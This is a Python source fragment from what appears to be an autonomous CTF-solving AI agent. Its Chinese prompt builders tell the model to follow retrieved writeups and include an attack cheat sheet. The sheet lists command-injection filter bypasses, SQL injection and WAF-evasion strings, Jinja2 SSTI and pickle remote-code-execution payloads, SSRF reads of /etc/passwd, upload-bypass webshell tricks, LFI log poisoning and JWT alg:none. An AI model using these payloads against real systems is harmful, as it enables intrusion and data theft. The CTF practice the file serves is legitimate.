                parts.append(f"- {basename} ({size}B)")
        if self._skills_text:
            parts.append(f"\n## 解题技能参考\n{self._skills_text[:3000]}")
        parts.append(f"\n## 可用工具\n{self._format_tool_specs()}")
        if self._auto_search_results:
            parts.append(f"\n{self._auto_search_results}")
            parts.append("\n## 极其重要：按照 writeup 的步骤执行！")
            parts.append("上面的搜索结果中已经包含了 writeup，你必须按照 writeup 的步骤来攻击！")
            parts.append("例如：如果 writeup 说 '用 gopher 协议发送 POST 请求到 /cgi-bin/'，你就用 run_shell 执行：")
            parts.append('  curl "http://TARGET/?url=gopher://127.0.0.1:80/POST%2520/cgi-bin/cmd%2520HTTP/1.1..." ')
            parts.append("如果 writeup 说 '用 filename 路径穿越写 CGI 脚本'，你就用 http_request 构造对应 URL。")
            parts.append("不要自己瞎猜，严格按照 writeup 步骤来！")
        parts.append("\n## 重要策略提示")
        if not self._auto_search_results:
            parts.append("- 用 web_search 搜索题名获取解题思路")
            parts.append("- 搜索格式: {\"tool_calls\": [{\"name\": \"web_search\", \"arguments\": {\"query\": \"题目名 CTF writeup\"}}]")
        parts.append("- Web 题优先用 run_shell + curl 发请求")
        parts.append("- 不要重复已执行的命令")
        parts.append("- 发现 flag{...} 格式时立即用 submit_flag 提交")
        parts.append("\n请开始解题。")
        return "\n".join(parts)

    def _format_tool_specs(self) -> str:
        lines = []
        for name, spec in sorted(self._tool_specs.items()):
            lines.append(f"### {name}")
            lines.append(f"  {spec.description}")
            if spec.input_schema.get("properties"):
                props = spec.input_schema.get("properties", {})
                for pname, pinfo in props.items():
                    required = pname in spec.input_schema.get("required", [])
                    req_mark = " (必填)" if required else ""
                    desc = pinfo.get("description", pinfo.get("type", ""))
                    lines.append(f"  - {pname}{req_mark}: {desc}")
            lines.append(f"  风险: {spec.risk_level} | 超时: {spec.timeout_seconds}s")
            lines.append("")
        return "\n".join(lines)

    def _build_system_prompt(self, tool_specs_desc: str) -> str:
        return (
            "你是 CTF 解题专家 Agent。你是一个可以调用工具的自主解题系统。\n"
            "你通过多轮对话与工具交互来解题。每轮你可以调用1-3个工具，观察结果后继续推理。\n\n"
            "## 核心原则\n"
            "1. 先观察，再推理，再行动。不要跳过信息收集直接猜答案。\n"
            "2. 必须基于工具返回的 observation 推进，不要猜测 flag。\n"
            "3. 如果工具返回不足，继续用 read_file / grep / run_shell 探索。\n"
            "4. 不重复已失败的命令。\n"
            "5. 写 Python 脚本时必须完整可运行（包含所有 import）。\n"
            "6. 发现 flag 时用 submit_flag 工具提交。\n"
            "7. Web 题可使用 http_request 或 run_shell 中的 curl 与目标交互。\n"
            "8. **如果上下文中已有 writeup/搜索结果，优先参考！不要忽略已有情报！**\n\n"
            "## 关键：善用搜索和已有情报！\n"
            "- 如果任务信息下方已包含搜索到的 writeup，直接参考其中的攻击思路和 payload\n"
            "- 不要看到 writeup 后还从头摸索，writeup 里已经告诉你解法了！\n"
            "- 按照 writeup 的步骤，用 run_shell / http_request / run_python 执行对应 payload\n"
            "- 如果自动搜索结果不够完整，可以用 web_search 搜索更多\n"
            "- 搜索示例: web_search query=\"SSRFme HITCON 2017 writeup\"\n"
            "- 搜索到有用 URL 后，用 web_fetch 获取完整 writeup 内容\n"
            "## Web CTF 攻击速查\n"
            "### 信息收集\n"
            "- curl -sk 'http://TARGET/' → 查看首页源码\n"
            "- curl -sI 'http://TARGET/' → 检查响应头（flag 可能藏在自定义头）\n"
            "- curl -sk 'http://TARGET/robots.txt' → 隐藏路径\n"
            "- curl -sk 'http://TARGET/.env' / '.git/HEAD' / 'backup.sql' → 敏感文件泄露\n\n"
            "### PHP 命令执行绕过（极高频！）\n"
            "- 分号被过滤或追加 >/dev/null: 用 %0a 换行符，如 c=ls%0a\n"
            "- cat 被过滤: 用 tac / nl / more / sort / rev / sed\\ -n\\ p / awk '{print}'\n"
            "- 空格被过滤: 用 ${IFS} 或 $IFS 或 {cat,flag.php}\n"
            "- 通配符: cat f* / cat flag??? / ca? flag.php\n"
            "- 管道: c=ls|| 或 c=ls|  输出仍可见\n"
            "- 反引号: c=`cat flag.php`\n\n"
            "### SQL 注入\n"
            "- 测试: ' OR 1=1-- / ' OR '1'='1\n"
            "- 联合查询: ' UNION SELECT 1,flag FROM flags--\n"
            "- 报错注入: extractvalue(1,concat(0x7e,(SELECT flag FROM flags)))\n"
            "- 反斜杠绕过: username=\\&password= OR 1=1--\n"
            "- WAF 绕过: sELect / /*!SELECT*/ / 双写 selselectect\n\n"
            "### SSTI (服务端模板注入)\n"
            "- 检测: {{7*7}} → 49 即 Jinja2\n"
            "- Jinja2 RCE: {{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag*').read()}}\n"
            "- Flask config: {{config.items()}}\n"
            "- Twig: {{['cat /flag.txt']|map('passthru')|join}}\n\n"
            "### SSRF\n"
            "- file:///etc/passwd / file:///flag 读取本地文件\n"
            "- gopher:// 协议走私\n"
            "- 内网探测: http://127.0.0.1:6379/ 等\n\n"
            "### 文件上传绕过\n"
            "- 扩展名: .phtml .php5 .phar .php.jpg (双扩展名)\n"
            "- .htaccess: AddType application/x-httpd-php .lol → 上传 .lol 执行\n"
            "- Content-Type 欺骗: 改 image/jpeg\n"
            "- 图片木马: copy valid.png/b + shell.php/a polyglot.php.jpg\n\n"
            "### 反序列化\n"
            "- PHP: 构造 O:8:\"Class\":1:{s:4:\"prop\";s:5:\"value\";}\n"
            "- Python pickle: class RCE: def __reduce__(self): return (os.system,('cat /flag*',))\n"
            "- Java: ysoserial CommonsCollections\n\n"
            "### LFI/RFI\n"
            "- php://filter/convert.base64-encode/resource=index → 源码泄露\n"
            "- /proc/self/environ / /var/log/apache2/access.log → 日志注入\n\n"
            "### JWT 攻击\n"
            "- alg:none → 修改 header 为 {\"alg\":\"none\"}\n"
            "- RS256→HS256 混淆\n"
            "- 弱密钥: flask-unsign / hashcat -m 16500\n\n"
            "## Reverse/Misc CTF 攻击速查\n"
            "- file + strings + binwalk 确定类型\n"
            "- ELF: checksec → readelf -s / objdump -d → 还原算法\n"
            "- PyInstaller: python3 -m pyinstxtractor file → .pyc 反编译\n"
            "- Brainfuck/VM: 提取 BF 代码 → 写 VM (tape cell 必须 & 0xff)\n"
            "- 图片: exiftool / zsteg / binwalk -e / pngcheck\n"
            "- PCAP: tshark -Y 'http' -T fields -e http.request.uri\n"
            "- 编码链: base64 → base32 → hex → rot13\n\n"
            "## 解题方法论\n"
            "1. 信息收集：curl/http_request/file/strings/binwalk/readelf 确定类型\n"
            "2. 关键提取：找到核心逻辑（BF代码/加密算法/校验函数/Web漏洞点）\n"
            "3. 漏洞利用：根据漏洞类型构造 payload/脚本\n"
            "4. 验证：确认 flag 格式正确后用 submit_flag 提交\n\n"
            "## 输出格式\n"
            "请输出 JSON 格式的 tool_calls：\n"
            "```json\n"
            '{"tool_calls": [{"name": "工具名", "arguments": {"参数名": "参数值"}}]}\n'
            "```\n\n"
            "也支持简单格式：\n"
            "- SHELL: <命令> — 执行 shell 命令\n"
            "- FLAG: <flag值> — 提交 flag\n"
        )

    def _record_llm_cost(self, step: str, resp: LLMResponse, route: RouteDecision, messages: List[Dict[str, str]]) -> None:
        try:
            model = route.model
            provider = route.provider
            if getattr(self.llm, "mock_mode", False):
                model = "mock"
                provider = "mock"
            self.cost_accounting.record(
                task_id=self.task_id, step=step, provider=provider, model=model,
                input_text=" ".join(m.get("content", "") for m in messages),
                output_text=getattr(resp, "content", "") or "",
                success=getattr(resp, "success", True),
                route_reason=route.reason, messages=messages, use_cache=True,
            )
        except Exception as e:
            logger.warning("record llm cost failed: %s", e)

    def get_trace(self) -> Dict[str, Any]:
        return {
            "task_id": self.task_id,
            "state": self.state,
            "best_flag": self.best_flag,
            "turn_count": len(self.turns),
            "turns": [t.to_dict() for t in self.turns[-10:]],
            "ledger": [r.to_dict() for r in self.ledger[-20:]],
            "candidate_flags": self.candidate_flags,
            "error": self.error,
        }
